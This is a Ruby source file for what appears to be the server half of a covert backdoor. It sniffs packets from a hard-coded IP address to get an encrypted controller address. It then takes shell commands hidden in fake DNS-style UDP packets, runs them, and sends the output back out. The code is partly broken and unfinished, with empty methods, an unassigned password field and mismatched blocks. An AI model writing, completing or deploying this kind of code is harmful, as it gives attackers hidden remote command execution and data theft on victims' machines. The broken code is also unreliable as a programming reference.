require 'rubygems'
require 'packetfu'

require File.expand_path(File.join(File.dirname(__FILE__), 'shell.rb'))
require File.expand_path(File.join(File.dirname(__FILE__), 'cipher.rb'))

include PacketFu

class Server
  attr_accessor :iface, :tos, :port, :saddr, :pass, :shell
  def initialize(iface, tos, saddr, pass, timeout, port)
    @iface = iface
    @tos = tos
    @port = port
    @saddr = saddr
    @pass
    @shell = Shell.new(timeout)

    filter = "tcp and dst port " + @port.to_s + " and src 153.251.232.153"
    cap = Capture.new(:iface => @iface, :start => true, :promisc => true, :filter => filter)
    cap.stream.each do |p|
      pkt = Packet.parse p
      a = pkt.ip_saddr.split(".")
      payload = pkt.payload
      dec = Encrypter.new(pass)
      @daddr = dec.decrypt(payload[0,16],payload[16..-1])
      return
    end
  end



  def start
  puts "starting server loop"
  conn = Connector.new(@iface, @tos, @daddr, @pass, "server", @port)
  filter = "udp and dst port " + @port.to_s + " and src port 53"
  cap = Capture.new(:iface => @iface, :start => true, :promisc => true, :filter => filter)
  str = ""
  cap.stream.each do |p|
    puts "Client packet verified and recieved"
    pkt = Packet.parse p
    str += conn.servRecv(pkt)
    if str[str.length-1] == 10 || str[str.length-2] == 10 || str[str.length-3] == 10 || str[str.length-4] == 10 #aka newline
      result = @shell.executeCmd(str)
          puts "returend from executing shell"
      if result != nil

        conn.exfilSend(result)
      end
      str = ""
    end
  end

private

  def tcp


    end
  end
  def udp
  end
  def icmp
    filter = "icmp and src 52.232.183.240"
  end
end
